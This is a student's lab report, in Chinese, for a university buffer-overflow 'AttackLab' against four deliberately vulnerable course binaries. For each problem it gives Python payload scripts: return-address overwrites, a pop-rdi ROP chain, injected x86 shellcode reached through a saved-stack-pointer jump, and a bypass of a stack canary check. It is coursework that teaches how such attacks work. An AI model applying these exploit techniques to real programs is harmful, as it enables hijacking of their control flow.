# 栈溢出攻击实验
姓名：潘羽
学号：2024201702

## 题目解决思路
先进行反汇编：
```
objdump -d problem1/2/3/4 > problem1/2/3/4.asm
```
然后从main函数开始进行gdb调试，读汇编代码

### Problem 1: 
- **分析**：一开始不太明白、没思路，询问ai后提示"I like ICS"在func1中输出，只要在从func的函数栈帧中下手（因为func函数中有strcpy这一不安全的输入函数），传入可以覆盖返回地址的参数，使之返回到0x401216：func1处即可。重新审视main函数的汇编代码，可以得知一开始传入了main的，命令行参数：%edi是整数类型，表示命令行参数的数量；%rsi是指针类型，指向一个字符串数组，数组中存储了具体的参数内容（即我们需要使用python代码产生的二进制txt文件路径/文件名）。
```asm
  40127e:	83 bd ec fe ff ff 02 	cmpl   $0x2,-0x114(%rbp)
  401285:	74 2d                	je     4012b4 <main+0x5c>
```
如上，只有传入参数是2个的时候main函数主体才可以正常运行。因此直接gdb调试（gdb problem1）
```
(gdb) set args solution1.txt
```
然后逐步ni。想先看一下func1函数里面是什么：
```
(gdb) start
(gdb) set $pc = 0x401216（即func1地址）
(gdb) continue
```
直接到func1处，则可以清楚地看到输出确实为"I like ICS"，这个思路确实是正确的！

- **解决方案**：接下来考虑传入何种参数可以恰好覆盖返回地址：在func函数中，有：
```
401246:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
```
那么strcpy函数会从-0x8(%rbp)处开始向高地址处填入，因而有：
```
rbp + 0x08: 返回地址 <- 我们的攻击目标

rbp + 0x00: 旧的 RBP (8 字节)

rbp - 0x08: 缓冲区起始位置 (8 字节) <- strcpy 从这里开始写入
```
因此
```
攻击方案如下：

构造一个包含 24 个字节的输入文件（Payload）：

前 16 个字节：任意填充字符（如 "A"），用于填满缓冲区并覆盖旧的 RBP。

接下来的 8 个字节：目标地址 0x401216 (func1 的地址)，注意需要使用小端序。
```
python代码如下：
```python
# 比如你发现你可以使用'A'去覆盖8个字节，然后跳转到0x114514地址就可以完成任务，那么你可以这么写你的payload并保存
padding = b"A" * 16
func1_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"  # 小端地址
payload = padding + func1_address
# Write the payload to a file
with open("solution1.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")
```
- **结果**：
![](./images/image1.png)

### Problem 2:
- **分析**：
基本思路同第一题，在func函数返回时进行操作，希望可以返回到func2里面（经过gdb调试验证，func2函数打印的确实是"Yes!I like ICS!"）。观察func2的asm码：
```asm
401222:	89 7d fc             	mov    %edi,-0x4(%rbp)
401225:	81 7d fc f8 03 00 00 	cmpl   $0x3f8,-0x4(%rbp)
```
只有从%edi中取出的值为$0x3f8时才能正常运行func2，因此需要在problem2.asm中找一个合适的函数能对%edi进行修改，发现是<pop_rdi>，因此直接让func函数返回到：
```
4012c7:	5f                   	pop    %rdi
```
再在紧靠着的高地址处写入我们需要的0x3f8，即：
```
arg_value = b"\xf8\x03\x00\x00\x00\x00\x00\x00"
```
因此在pop %rdi后，便已经完成了对%edi的修改，再让<pop_rdi>的栈帧返回到函数func2（地址为0x401216），正常运行即可打印我们需要的语句了~

- **解决方案**：
python代码如下：
```python
padding = b"A" * 16

pop_rdi_addr = b"\xc7\x12\x40\x00\x00\x00\x00\x00"

arg_value = b"\xf8\x03\x00\x00\x00\x00\x00\x00"

func2_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + pop_rdi_addr + arg_value  + func2_addr

with open("solution2.txt", "wb") as f:
    f.write(payload)
```
- **结果**：![](./images/image2.png)


### Problem 3:

- **分析**：
这道题挺难的，提示里说要注意栈地址的变化情况。通过反汇编发现func函数里多了一步操作：它把当前的%rsp存进了一个全局变量saved_rsp中。
```asm
  401368:	48 89 05 a1 21 00 00 	mov    %rax,0x21a1(%rip)        # 403510 <saved_rsp>
```
再看题目给出的代码片段，有一个jmp_xs函数。它会把这个saved_rsp取出来加上0x10然后直接jmp过去。
```asm
  401347:	48 83 45 f8 10       	addq   $0x10,-0x8(%rbp)
  401350:	ff e0                	jmp    *%rax                    # 这里的 %rax 就是 saved_rsp + 0x10
```
经过计算saved_rsp + 0x10恰好指向我们输入的缓冲区开头。既然这题没有限制Nxenabled，且没有像problem2那样现成的传参gadget，最直接的思路就是把返回地址覆盖为0x401334（jmp_xs），然后自己在输入的最开头写一段 Shellcode。只要这段代码能把%edi改成114(即0x72)，再调用func1(地址0x401216) 就能过。

- **解决方案**：
偏移量：缓冲区在rbp-0x20，返回地址在rbp+0x8，总共需要40字节的 Padding。
Payload：最前面放 Shellcode，后面填满A，最后放jmp_xs的地址。

python 代码如下：

```python
shellcode = b"\xbf\x72\x00\x00\x00\x48\xc7\xc0\x16\x12\x40\x00\xff\xd0"

padding = shellcode + b"A" * (40 - len(shellcode))

return_addr = b"\x34\x13\x40\x00\x00\x00\x00\x00"

payload = padding + return_addr

with open("solution3.txt", "wb") as f:
    f.write(payload)
```

- **结果**：
![](./images/image3.png)


### Problem 4:

* **分析**：
题目已经告诉我们使用了Canary保护，且提示说“真的需要写代码吗”。首先反汇编查看 `func` 函数，确实在函数开头和结尾发现了 Canary 的身影：

```asm
136c:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
1375:	48 89 45 f8          	mov    %rax,-0x8(%rbp)

# 结尾检查
140a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
140e:	64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax
1417:	74 05                	je     141e <func+0xc1>
1419:	e8 b2 fc ff ff       	call   10d0 <__stack_chk_fail@plt>
```
Canary机制就是在栈帧的返回地址和局部变量之间插入一个随机值（哨兵），函数返回前检查这个值是否被覆盖。如果发生溢出，哨兵通常会被破坏，程序就会报错终止。
但是，仔细观察func，可以发现一个捷径：
```asm
13df:	83 7d f4 ff          	cmpl   $0xffffffff,-0xc(%rbp)
13e3:	74 11                	je     13f6 <func+0x99>
...
13f6:	e8 1c ff ff ff       	call   131c <func1>      # 这里输出成功信息
1400:	bf 00 00 00 00       	mov    $0x0,%edi
1405:	e8 f6 fc ff ff       	call   1100 <exit@plt>   # 直接退出了！
```
只要我们输入的数让-0xc(%rbp)等于-1，程序就会调用func1打印通关信息，然后直接调用exit退出程序。因为直接exit了，程序根本不会执行到函数末尾的Canary检查指令，从而绕过了金丝雀值的保护。
再看main函数，在进入func之前有两次scanf（问名字和是否喜欢ICS），这两个输入应该是随便怎么写都行，最后输入-1即可。

* **解决方案**：
前两行随便输点字符串应付scanf，最后输入-1。

* **结果**：
![](./images/image4.png)

## 思考与总结
确实如助教师兄所言，这个AttackLab是baby-attack，相比于原汁原味的attacklab难度降低很多了。我基本上沿用了BombLab的做题思路，先整体把握一下asm码中的几个重要函数(func、func1、func2、main等)，然后gdb调试慢慢去读asm码，只要汇编读的好，理解的准，bomb和attack基本上就是一样地做。

这个lab一定程度上提升了我的计算机素养。“函数调用栈”一开始对我而言只是一个抽象的概念，通过bomb和attack两个lab的学习，将其转化为了在内存中的具体布局。我也深刻体会到了缓冲区溢出的危险性，在于它能够打破数据与代码的边界，让攻击者能够劫持程序的控制流。

Attack Lab还是很硬核，可以称得上“干货”。不仅锻炼了我的逆向分析能力，也给我的编程习惯敲响了警钟：在以后的开发中，必须严格检查数组边界、警惕整数溢出，并尽量避免使用如 strcpy 等不安全的库函数，从源头上减少漏洞的产生。


## 参考资料
复习了一下之前的bomblab（？这个算么2333）